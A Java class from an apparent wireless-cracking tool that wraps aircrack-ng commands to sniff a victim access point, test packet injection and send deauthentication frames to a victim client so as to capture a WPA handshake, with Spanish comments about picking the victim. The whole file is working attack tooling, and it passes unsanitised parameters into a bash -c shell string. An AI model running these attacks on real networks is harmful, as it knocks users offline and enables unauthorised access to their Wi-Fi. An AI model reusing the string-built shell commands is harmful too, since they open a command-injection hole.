package attack;

import avatarwirelesscrackingtool.Shell;
import java.io.IOException;

public class WPAWPA2 {

    Shell shell = new Shell();

    public WPAWPA2() {
    }

    /*
    General Functionalities
     -Functionalities
    1. Start Sniffing and Loggind:
    cmd = "airodump-ng -c " + Channel + " -w " + dump_file  + " --bssid " + Bssidvic + " " +monitor;
     -Test
    1. Performs a test of injection AP:
    ( command = "aireplay-ng -9 -a " + Bssidvic + " " + monitor;
             )
     */
    public void StartSniffingAndLoggind(String Channel, String Bssidvic, String monitor) throws IOException {
        String dump_file = "";

        String command = "airodump-ng -c " + Channel + " -w " + dump_file + " --bssid " + Bssidvic + " " + monitor;
        String cmd = "xterm -e 'bash -c \"" + command + "\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    public void TestOfInjectionAP(String Bssidvic, String monitor) throws IOException {

        String command = "aireplay-ng -9 -a " + Bssidvic + " " + monitor;
        String cmd = "xterm -e 'bash -c \"" + command + "\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

    /*
    WPA ATTACKS
     -WPA Handshake attack
    necesitamos obtener un cliente victima que este conectado a la red victima un (metodo que haga esto :v)
    necesitamos un numero entre 0 y 90 para el valor de self.deauth_WPA_num
    self.ac es la direccion mac de la victima, self.ac_victim_wpa es la direccion mac del cliente victima
    y self.mymon es la network interface en modo monitor.
    
    (command = 'aireplay-ng -0 ' + self.deauth_WPA_num + ' -a ' + self.ac + ' -c ' + self.ac_victim_wpa + ' ' + self.mymon
            )
    
     */
    public void WPAHandshakeAttack(String numDeauth, String Bssidvic, String VictimClient, String monitor) throws IOException {

        String command = "aireplay-ng -0 " + numDeauth + " -a " + Bssidvic + " -c " + VictimClient + " " + monitor;
        String cmd = "xterm -e 'bash -c \"" + command + "\"; read; '";
        shell.ExecuteCommandString(cmd);

    }

}
